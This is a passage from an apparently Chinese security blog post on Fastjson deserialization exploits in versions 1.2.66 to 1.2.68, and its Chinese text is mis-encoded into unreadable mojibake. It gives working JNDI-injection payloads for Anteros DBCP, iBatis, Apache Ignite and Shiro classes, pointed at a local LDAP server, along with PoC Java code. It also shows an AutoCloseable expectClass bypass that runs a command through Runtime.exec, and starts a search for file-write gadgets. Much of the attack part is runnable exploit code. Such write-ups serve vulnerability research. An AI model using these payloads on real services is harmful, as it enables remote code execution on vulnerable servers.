·æ˜¯addè¿›äº†fieldList</p><p>ç„¶åè·Ÿè¿›å»newFieldInfoé‡Œé¢ï¼Œè¿™é‡Œè¦æ³¨æ„ä¸€ä¸ªé‡è¦çš„å±æ€§<strong>getOnly</strong></p><p><img src="https://cdn.clown2024.cn/202409010215166.png" alt="image-20240901021533021"></p><p>åœ¨è¿™é‡Œé¢å°†getOnlyèµ‹å€¼ä¸ºäº†true</p><p>ç„¶åä¸€è·¯è·Ÿè¿›æœ€åä¼šè¿›åˆ°è¿™ä¸ªæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409010221406.png" alt="image-20240901022101254"></p><p>æ­¤æ—¶getOnlyå·²ç»ä¸ºtrueï¼Œç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409010221503.png" alt="image-20240901022129364"></p><p>æœ€ç»ˆèµ°åˆ°è¿™æ‰§è¡Œäº†getæ–¹æ³•</p><p>æ‰€ä»¥æ€»ç»“æ‰§è¡Œgetæ–¹æ³•çš„æ¡ä»¶(ä¸è¿‡ä¸»è¦æ˜¯é’ˆå¯¹ç”¨äº†parseæ–¹æ³•è€Œæ²¡ç”¨parseObjectï¼Œå› ä¸ºparseObjectæœ¬èº«å°±ä¼šè¿getä¸€èµ·æ‰§è¡Œ)ï¼š</p><p>parseä»–ä¼šå»ä¼˜å…ˆå»åŒ¹é…è°ƒç”¨å­—æ®µçš„setæ–¹æ³•ï¼Œå¦‚æœæ²¡æœ‰setæ–¹æ³•ï¼Œå°±ä¼šå»å¯»æ‰¾å­—æ®µçš„getæ–¹æ³•ä¸”è¿”å›å€¼è¦æ˜¯Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong</p><blockquote><p>æ‰€ä»¥å‰é¢å¯èƒ½å†™çš„æœ‰ç‚¹ä¹±ï¼Œå› ä¸ºå†™åˆ°è¿™æ‰çœŸæ­£è°ƒä¼šgetå’Œsetçš„è°ƒç”¨ğŸ˜¢</p></blockquote><p><strong>br.com.anteros.dbcp.AnterosDBCPConfig</strong></p><p>å¯¼å…¥ä¾èµ–ï¼š</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/br.com.anteros/Anteros-Core --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>br.com.anteros<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Anteros-Core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/br.com.anteros/Anteros-DBCP --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>br.com.anteros<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Anteros-DBCP<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>expï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Anteros_Version</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        String payload1=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;ldap://127.0.0.1:9999/xCxXLJwZ\&quot;&#125;&quot;</span>;<br>        String payload2=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;healthCheckRegistry\&quot;:\&quot;ldap://127.0.0.1:9999/xCxXLJwZ\&quot;&#125;&quot;</span>;<br>        JSON.parse(payload1);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>payload1åˆ†æ</strong></p><p>è°ƒç”¨AnterosDBCPConfig#setMetricRegistry</p><p><img src="https://cdn.clown2024.cn/202409011042417.png" alt="image-20240901104216255"></p><p>ç„¶åè°ƒç”¨AnterosDBCPConfig#getObjectOrPerformJndiLookup</p><p><img src="https://cdn.clown2024.cn/202409011043947.png" alt="image-20240901104316840"></p><p>è¿™é‡Œå­˜åœ¨jndiæ³¨å…¥æ¼æ´</p><p><strong>payload2åˆ†æ</strong></p><p>è°ƒç”¨AnterosDBCPConfig#setHealthCheckRegistry</p><p><img src="https://cdn.clown2024.cn/202409011044736.png" alt="image-20240901104447626"></p><p>è°ƒç”¨AnterosDBCPConfig#getObjectOrPerformJndiLookup</p><p><img src="https://cdn.clown2024.cn/202409011045210.png" alt="image-20240901104535103"></p><p>è¿™é‡Œå­˜åœ¨jndiæ³¨å…¥æ¼æ´</p><blockquote><p>è¿™ä¸ªAnterosçœ‹mavenä»“åº“ç”¨çš„äººå¥½å°‘ï¼Œæ„Ÿè§‰æ¯”è¾ƒéš¾ç¢°åˆ°</p></blockquote><p><strong>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig</strong></p><p>å¯¼å…¥ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.ibatis/ibatis-sqlmap --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.ibatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ibatis-sqlmap<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.4.726<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/javax.transaction/jta --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.transaction<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jta<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>expï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JTA_Version</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String payload=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&quot;,\&quot;properties\&quot;: &#123;\&quot;@type\&quot;:\&quot;java.util.Properties\&quot;,\&quot;UserTransaction\&quot;:\&quot;ldap://127.0.0.1:9999/xCxXLJwZ\&quot;&#125;&#125;&quot;</span>;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409011109175.png" alt="image-20240901110919034"></p><p>åˆ©ç”¨é“¾åˆ†æ</p><p>é¦–å…ˆè°ƒç”¨åˆ°JtaTransactionConfig#setPropertiesæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409011111348.png" alt="image-20240901111125227"></p><p>è¿™é‡Œå­˜åœ¨jndiæ¼æ´ï¼Œä½†æ˜¯utxNameè·å–ä¸ºå›ºå®šçš„é”®å€¼ï¼Œä¸ºPropertieså¯¹è±¡çš„UserTransaction</p><p>æ‰€ä»¥payloadé‡Œçš„propertieså€¼çš„è®¾ç½®ä¸ºPropertiesç±»ç„¶ååŠ ä¸€ä¸ªUserTransactionå±æ€§</p><h2 id="fastjson1267"><a href="#Fastjson1-2-67" class="headerlink" title="Fastjson1.2.67"></a>Fastjson1.2.67</h2><p>ä¹Ÿæ˜¯é»‘åå•ç»•è¿‡ï¼Œç›´æ¥ç»™payloadï¼Œä¸æƒ³åˆ†æäº†ï¼ˆ</p><p>è¿™é‡Œçš„æ¡ä»¶ä¹Ÿæ˜¯å¼€å¯autoType</p><p><strong>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup</strong></p><p>éœ€è¦ignite-coreã€ignite-jtaå’Œjtaä¾èµ–</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;, &quot;jndiNames&quot;:[&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;], &quot;tm&quot;: &#123;&quot;$ref&quot;:&quot;$.tm&quot;&#125;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.ignite/ignite-jta --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.ignite<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ignite-jta<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.transaction<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jta<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.ignite/ignite-core --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.ignite<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ignite-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.8.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä»£ç ç¤ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">liuqi_banben</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        String payload=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\&quot;, \&quot;jndiNames\&quot;:[\&quot;ldap://127.0.0.1:9999/BXcEBBgx\&quot;], \&quot;tm\&quot;: &#123;\&quot;$ref\&quot;:\&quot;$.tm\&quot;&#125;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409031930659.png" alt="image-20240903193000515"></p><p>åˆ©ç”¨é“¾åˆ†æï¼š</p><p>æ ¹æ®pocæ¥çœ‹çœ‹æ¼æ´ç‚¹</p><p><img src="https://cdn.clown2024.cn/202409031938377.png" alt="image-20240903193814261"></p><p><img src="https://cdn.clown2024.cn/202409031938851.png" alt="image-20240903193827745"></p><p>æ‰€ä»¥å°±æ˜¯ä»jndiNameséå†ï¼Œç„¶ååœ¨getTmæ–¹æ³•ä¸­è§¦å‘jndiæ¼æ´ï¼Œè¿™é‡Œçš„tmå±æ€§åªæœ‰getæ–¹æ³•</p><p>ä½†æ˜¯æ ¹æ®ä»–çš„è¿”å›å€¼çœ‹èµ·æ¥å¹¶ä¸æ»¡è¶³æˆ‘ä»¬å‰é¢è¯´çš„è§¦å‘getæ–¹æ³•çš„ç‰¹å¾ï¼Œè¿™é‡Œå°±æ¶‰åŠåˆ°Fastjsonçš„å¾ªç¯å¼•ç”¨</p><p><strong>å¾ªç¯å¼•ç”¨</strong></p><p><a href="https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8">https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8</a></p><p>fastjsonæ”¯æŒå¾ªç¯å¼•ç”¨ï¼Œå¹¶ä¸”æ˜¯ç¼ºçœæ‰“å¼€çš„ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//å¼•ç”¨å¯ä»¥è‡ªå·±å…³é—­ï¼Œå…³é—­åå¯èƒ½å¯¼è‡´jsonæ•°æ®ä¼ è¾“çš„æ—¶å€™ä¸¢å¤±<br>//å…¨å±€é…ç½®å…³é—­<br>JSON.DEFAULT_GENERATE_FEATURE |= SerializerFeature.DisableCircularReferenceDetect.getMask();<br>//éå…¨å±€å…³é—­<br>JSON.toJSONString(obj, SerializerFeature.DisableCircularReferenceDetect);<br></code></pre></td></tr></table></figure><table><thead><tr><th>è¯­æ³•</th><th>æè¿°</th></tr></thead><tbody><tr><td>{â€œ$refâ€:â€$â€}</td><td>å¼•ç”¨æ ¹å¯¹è±¡</td></tr><tr><td>{â€œ$refâ€:â€@â€}</td><td>å¼•ç”¨è‡ªå·±</td></tr><tr><td>{â€œ$refâ€:â€..â€}</td><td>å¼•ç”¨çˆ¶å¯¹è±¡</td></tr><tr><td>{â€œ$refâ€:â€..&#x2F;..â€}</td><td>å¼•ç”¨çˆ¶å¯¹è±¡çš„çˆ¶å¯¹è±¡</td></tr><tr><td>{â€œ$refâ€:â€$.members[0].reportToâ€}</td><td>åŸºäºè·¯å¾„çš„å¼•ç”¨</td></tr></tbody></table><p><code>$ref</code>å³å¾ªç¯å¼•ç”¨ï¼šå½“ä¸€ä¸ªå¯¹è±¡åŒ…å«å¦ä¸€ä¸ªå¯¹è±¡æ—¶ï¼ŒFastjsonå°±ä¼šæŠŠè¯¥å¯¹è±¡è§£ææˆå¼•ç”¨ã€‚å¼•ç”¨æ˜¯é€šè¿‡<code>$ref</code>æ ‡ç¤ºçš„ã€‚</p><p>æ‰€ä»¥è¿™é‡Œpocåé¢çš„{â€œ$refâ€:â€$.tmâ€}å°±æ˜¯åŸºäºè·¯å¾„å¼•ç”¨ï¼Œç›¸å½“äºè°ƒç”¨äº†æ ¹å¯¹è±¡çš„tmå±æ€§ï¼Œè‡ªç„¶å°±è¦è°ƒç”¨getæ–¹æ³•ï¼Œè¿™é‡Œçš„æ ¹å¯¹è±¡å°±æ˜¯CacheJndiTmLookup</p><p><strong>org.apache.shiro.jndi.JndiObjectFactory</strong></p><p>éœ€è¦shiro-coreå’Œslf4j-apiä¾èµ–</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;,&quot;instance&quot;:&#123;&quot;$ref&quot;:&quot;$.instance&quot;&#125;&#125;<br></code></pre></td></tr></table></figure><p>ä»£ç ç¤ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">liuqi_banben</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        String payload2=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.jndi.JndiObjectFactory\&quot;,\&quot;resourceName\&quot;:\&quot;ldap://127.0.0.1:9999/BXcEBBgx\&quot;,\&quot;instance\&quot;:&#123;\&quot;$ref\&quot;:\&quot;$.instance\&quot;&#125;&#125;&quot;</span>;<br>        JSON.parse(payload2);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409031934084.png" alt="image-20240903193341386"></p><p><strong>åˆ©ç”¨é“¾åˆ†æ</strong></p><p><img src="https://cdn.clown2024.cn/202409032004058.png" alt="image-20240903200449945"></p><p><img src="https://cdn.clown2024.cn/202409032004849.png" alt="image-20240903200455729"></p><p>è¿™é‡Œå°±åŒç†ï¼Œè¯¥ç±»ä¹Ÿæ˜¯åªæœ‰getInstanceæ–¹æ³•ï¼Œç„¶ååˆ©ç”¨å¾ªç¯å¼•ç”¨ç„¶åè°ƒç”¨åˆ°getæ–¹æ³•è§¦å‘jndiæ¼æ´</p><h2 id="fastjson1268"><a href="#Fastjson1-2-68" class="headerlink" title="Fastjson1.2.68"></a>Fastjson1.2.68</h2><p>è¿™æ¬¡æ˜¯åˆ©ç”¨expectClassæ¥ç»•è¿‡checkAutoTypeå‡½æ•°ï¼Œå¤§ä½“æ€è·¯å¦‚ä¸‹ï¼š</p><ol><li>å…ˆä¼ å…¥æŸä¸ªç±»ï¼Œå…¶åŠ è½½æˆåŠŸåå°†ä½œä¸ºexpectClasså‚æ•°ä¼ å…¥checkAutoType()å‡½æ•°ï¼›</li><li>æŸ¥æ‰¾expectClassç±»çš„å­ç±»æˆ–å®ç°ç±»ï¼Œå¦‚æœå­˜åœ¨è¿™æ ·ä¸€ä¸ªå­ç±»æˆ–å®ç°ç±»å…¶æ„é€ æ–¹æ³•æˆ–setteræ–¹æ³•ä¸­å­˜åœ¨å±é™©æ“ä½œåˆ™å¯ä»¥è¢«æ”»å‡»åˆ©ç”¨ï¼›</li></ol><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><ul><li>åˆ©ç”¨ç±»å¿…é¡»æ˜¯expectClassç±»çš„å­ç±»æˆ–å®ç°ç±»ï¼Œå¹¶ä¸”ä¸åœ¨é»‘åå•ä¸­ï¼›</li></ul><p>è¿™é‡Œå…ˆå±•ç¤ºæ”»å‡»æµç¨‹</p><p>å‡è®¾FastjsonæœåŠ¡ç«¯å­˜åœ¨å¦‚ä¸‹å®ç°AutoCloseableæ¥å£ç±»çš„æ¶æ„ç±»VulAutoCloseableï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VulAutoCloseable</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AutoCloseable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">VulAutoCloseable</span><span class="hljs-params">(String cmd)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(cmd);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>pocå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;vul.VulAutoCloseable&quot;,&quot;cmd&quot;:&quot;calc&quot;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-comment">//fastjson1.2.68</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AutoType_RaoGuo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String payload=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;org.clown.vul.VulAutoCloseable\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409031446394.png" alt="image-20240903144639232"></p><p>å¯ä»¥çœ‹åˆ°æ²¡æœ‰å¼€å¯autoTypeSupportä¹Ÿèƒ½å¤ŸæˆåŠŸ</p><p>ç›´æ¥ä»checkAutoTypeå‡½æ•°å¼€å§‹è°ƒè¯•</p><p><img src="https://cdn.clown2024.cn/202409031453120.png" alt="image-20240903145345998"></p><p>åˆ°è¿™é‡Œå¯ä»¥ç›´æ¥å¯ä»¥ä»ç¼“å­˜ä¸­è·å–åˆ°AutoCloseableè¿™ä¸ªç±»</p><p><img src="https://cdn.clown2024.cn/202409031502045.png" alt="image-20240903150200931"></p><p>ç„¶åå¾€ä¸‹ç›´æ¥returnäº†ï¼Œå› ä¸ºè¿™æ—¶å€™expectClassè¿˜æ˜¯ç©ºçš„</p><p><img src="https://cdn.clown2024.cn/202409031532444.png" alt="image-20240903153245307"></p><p>ç„¶åä¼ è¿›å»AutoCloseableååºåˆ—åŒ–ï¼Œç»§ç»­è·Ÿè¿›</p><p><img src="https://cdn.clown2024.cn/202409031542039.png" alt="image-20240903154215912"></p><p>åˆ°è¿™é‡Œè·å–ååºåˆ—åŒ–å™¨ä¸ºç©ºï¼Œç„¶åtypeNameä¸ºæˆ‘ä»¬çš„å®ç°ç±»ï¼ŒexpectClassä¼ é€’çš„æ˜¯AutoCloseableç±»ï¼Œç»§ç»­è·Ÿè¿›checkAutoTypeå‡½æ•°</p><p><img src="https://cdn.clown2024.cn/202409031554161.png" alt="image-20240903155427045"></p><p>åˆ°è¿™é‡ŒexpectClassFlagå°±ä¸ºtrueäº†</p><p><img src="https://cdn.clown2024.cn/202409031557163.png" alt="image-20240903155741275"></p><p>æœ€åèµ°åˆ°è¿™ä¸ªåœ°æ–¹ï¼ŒexpectClassFlagä½¿åˆ¤æ–­ä¸ºtrueï¼Œæœ€ç»ˆè¿›è¡ŒloadClass</p><p><img src="https://cdn.clown2024.cn/202409031604442.png" alt="image-20240903160414341"></p><p>ç„¶åå¾€ä¸‹æœ‰å¯¹åŠ è½½çš„ç±»è¿›è¡Œåˆ¤æ–­ï¼Œè¿™äº›éƒ½æ˜¯å¸¸è§çš„jndiåˆ©ç”¨é“¾çš„ç±»ï¼Œå¦‚æœå±äºè¿™äº›ç±»æˆ–è€…å­ç±»ç›´æ¥æŠ›å‡ºå¼‚å¸¸</p><p><img src="https://cdn.clown2024.cn/202409031602941.png" alt="image-20240903160225818"></p><p>å¾€ä¸‹è¿˜æœ‰ä¸€ä¸ªåŠ å…¥ç¼“å­˜ï¼Œç„¶åreturnï¼Œè¿™é‡Œè¿˜åˆ¤æ–­äº†æˆ‘ä»¬çš„clazzæ˜¯å¦ä¸ºexpectClassçš„å­ç±»ï¼Œæ‰€ä»¥æ¶æ„ç±»å¿…é¡»è¦ç»§æ‰¿expectClass</p><p>ç„¶åå°±æ˜¯ååºåˆ—åŒ–è§¦å‘æ„é€ å‡½æ•°å¼¹è®¡ç®—å™¨</p><blockquote><p>ä¸è¿‡è¿™é‡Œä¸è¿‡getæˆ–è€…setç›´æ¥æ„é€ å‡½æ•°ä¹Ÿå¯ä»¥äº†ï¼Œåœ¨æ—©æœŸç‰ˆæœ¬æˆ‘è¯•äº†ä¸€ä¸‹åªèƒ½é»˜è®¤æ„é€ æ–¹æ³•ï¼Œä¸è¿‡å¦‚æœå­˜åœ¨é»˜è®¤æ„é€ æ–¹æ³•ä¹Ÿæ˜¯ä¼˜å…ˆé»˜è®¤æ„é€ æ–¹æ³•</p></blockquote><h3 id="å®æˆ˜åˆ©ç”¨"><a href="#å®æˆ˜åˆ©ç”¨" class="headerlink" title="å®æˆ˜åˆ©ç”¨"></a>å®æˆ˜åˆ©ç”¨</h3><p>å®æˆ˜ä¸­è¦å»æ‰¾å®é™…å¯è¡Œçš„åˆ©ç”¨ç±»ï¼Œä¹Ÿå°±æ˜¯ç»§æ‰¿äº†autoCloaseableç±»çš„ï¼Œä¸»è¦æ˜¯å¯»æ‰¾å…³äºè¾“å…¥è¾“å‡ºæµçš„ç±»æ¥å†™æ–‡ä»¶ï¼ŒIntputStreamå’ŒOutputStreaméƒ½æ˜¯å®ç°è‡ªAutoCloseableæ¥å£çš„ã€‚</p><p>å¯»æ‰¾gadgetçš„æ¡ä»¶å¯ä»¥å‚è€ƒè¿™æ ·ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">éœ€è¦ä¸€ä¸ªé€šè¿‡ set æ–¹æ³•æˆ–æ„é€ æ–¹æ³•æŒ‡å®šæ–‡ä»¶è·¯å¾„çš„ OutputStream<br>éœ€è¦ä¸€ä¸ªé€šè¿‡ set æ–¹æ³•æˆ–æ„é€ æ–¹æ³•ä¼ å…¥å­—èŠ‚æ•°æ®çš„ OutputStreamï¼Œå‚æ•°ç±»å‹å¿…é¡»æ˜¯byte[]ã€ByteBufferã€Stringã€char[]å…¶ä¸­çš„ä¸€ä¸ªï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ set æ–¹æ³•æˆ–æ„é€ æ–¹æ³•ä¼ å…¥ä¸€ä¸ª OutputStreamï¼Œæœ€åå¯ä»¥é€šè¿‡ write æ–¹æ³•å°†ä¼ å…¥çš„å­—èŠ‚ç  write åˆ°ä¼ å…¥çš„ OutputStream<br>éœ€è¦ä¸€ä¸ªé€šè¿‡ set æ–¹æ³•æˆ–æ„é€ æ–¹æ³•ä¼ å…¥ä¸€ä¸ª OutputStreamï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡è°ƒç”¨ toStringã€hashCodeã€getã€setã€æ„é€ æ–¹æ³• è°ƒç”¨ä¼ å…¥çš„ OutputStream çš„ closeã€write æˆ– flush 